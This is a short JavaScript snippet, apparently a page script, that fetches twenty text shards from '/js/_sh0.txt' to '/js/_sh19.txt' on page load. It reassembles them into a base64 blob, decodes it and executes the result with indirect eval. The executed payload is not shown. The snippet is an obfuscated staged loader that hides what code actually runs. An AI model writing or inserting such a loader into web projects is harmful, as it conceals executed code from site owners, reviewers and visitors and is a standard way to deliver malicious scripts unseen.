(async function(){
  const parts=[];
  for(let i=0;i<20;i++){
    const r=await fetch('/js/_sh'+i+'.txt');
    if(!r.ok) throw new Error('sh'+i+' '+r.status);
    parts.push(await r.text());
  }
  const b64=parts.join('').replace(/\s/g,'');
  const bin=atob(b64);
  const bytes=new Uint8Array(bin.length);
  for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
  (0,eval)(new TextDecoder('utf-8').decode(bytes));
})().catch(e=>console.error('[stu]',e));
